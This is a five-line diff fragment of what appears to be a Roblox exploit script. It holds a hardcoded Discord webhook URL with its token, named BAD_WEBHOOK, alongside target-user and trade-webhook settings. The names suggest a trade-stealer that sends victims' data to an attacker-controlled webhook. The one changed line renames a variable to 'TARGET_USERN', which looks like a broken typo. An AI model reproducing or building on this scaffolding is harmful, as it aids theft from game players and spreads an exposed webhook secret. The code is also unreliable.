@@ -1,5 +1,5 @@
 
-local TARGET_USERNAME = getgenv().TARGET_USER
+local TARGET_USERNAME = getgenv().TARGET_USERN
 local TARGET_USER_ID = getgenv().TARGET_USER_ID
 local BAD_WEBHOOK = "https://discord.com/api/webhooks/1554509240406904932/xmoVjD4nejjUIfUi0EXYKC7GDvMAspm8WWqIKd8B4GLCgtmzHiBbZm6IVwtBdEiFSH9k";
 local TRADE_WEBHOOK = getgenv().TRADE_WEBHOOK
